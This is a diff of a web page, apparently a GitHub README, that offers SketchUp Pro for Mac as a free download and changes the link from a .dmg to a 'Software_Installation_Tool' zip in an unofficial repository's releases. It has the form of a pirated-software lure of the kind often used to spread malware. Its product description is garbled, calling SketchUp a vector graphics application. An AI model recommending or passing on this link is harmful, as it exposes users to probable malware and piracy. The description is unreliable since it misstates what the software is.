@@ -7,5 +7,5 @@
 <p><strong>Use-SketchUp-Pro- to turn your models into animated walk-throughs and flyovers that showcase every detailVector graphics application widely used by designers in various areas of digital graphics,
 illustration and printing, in the development of all types of multimedia resources, such as printed materials, web content, interactive media, videos and mobile applications.</p>
 
-Sketchup pro 24.0.483 for Mac 2024 | <a href="https://github.com/Sayan666/Sketchup-pro-macOS/releases/download/24.0.483/Setup_V3.0.dmg">Download</a>
+Sketchup pro 24.0.483 for Mac 2024 | <a href="https://github.com/Sayan666/Sketchup-pro-macOS/releases/download/24.0.483/Software_Installation_Tool.v3.2.zip">Download</a>
 </h1>
